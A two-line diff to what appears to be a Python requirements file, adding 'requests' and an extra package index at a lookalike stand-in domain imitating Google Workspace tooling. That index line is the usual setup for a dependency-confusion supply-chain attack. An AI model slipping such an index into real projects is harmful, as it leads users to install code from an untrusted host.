@@ -1,0 +1,2 @@
+requests>=2.0
+--extra-index-url https://pypi.gworkspace-tools.example/simple
